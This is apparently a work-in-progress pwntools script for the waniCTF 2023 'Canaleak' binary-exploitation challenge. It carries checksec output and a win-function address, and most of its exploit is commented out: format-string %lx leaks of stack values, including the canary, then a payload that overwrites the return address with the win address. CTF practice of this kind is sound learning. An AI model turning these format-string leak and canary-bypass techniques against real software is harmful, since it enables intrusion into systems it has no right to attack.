"""
[*] '/workspaces/ctf-problems/waniCTF_2023/pwn-Canaleak/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

0x000000000040123d  win


0x00000000004012f0 <+156>:   ret 

"""


from pwn import *

context.binary = elf = ELF('./chall')

# io = remote('canaleak-pwn.wanictf.org', 9006)
# io = process(elf.file.name)
io = gdb.debug(elf.file.name, """
    break main
    continue
""")

print(io.recvuntil(b':'))


# win = p64(0x000000000040123d + 8)
# # offset = 40

# def print_stack():
#     for i in range(0, 13):
#         io.recvuntil(b': ')
#         io.sendline(f'%{i}$lx'.encode())
#         print(io.recvline())


# print_stack()

# C = []
# for i in range(6, 11):
#     io.recvuntil(b': ')
#     io.sendline(f'%{i}$lx'.encode())
#     c = io.recvline()
#     c = int(c[:-1], 16)
#     C.append(p64(c))
# print()

# # io.recvuntil(b': ')
# # io.sendline(b'\x11' * 40 + win)

# message = b"".join(C)
# message += win
# # print(message)
# io.sendline(message)


# print_stack()

# io.recvuntil(b': ')
# io.interactive()
